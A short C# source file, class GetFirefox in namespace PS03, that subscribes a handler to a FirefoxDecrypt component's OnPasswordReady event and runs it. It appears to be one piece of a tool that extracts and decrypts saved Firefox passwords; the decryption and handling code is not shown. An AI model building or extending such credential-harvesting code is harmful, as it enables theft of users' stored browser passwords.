using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PS03
{
    public class GetFirefox
    {
        public void Execute()
        {
            var ev = new Eventhandlers();
            FirefoxDecrypt.FDC.OnPasswordReady += ev.HandleFirefoxDataReady;
            FirefoxDecrypt.FDC.Execute();
        }
    }
}
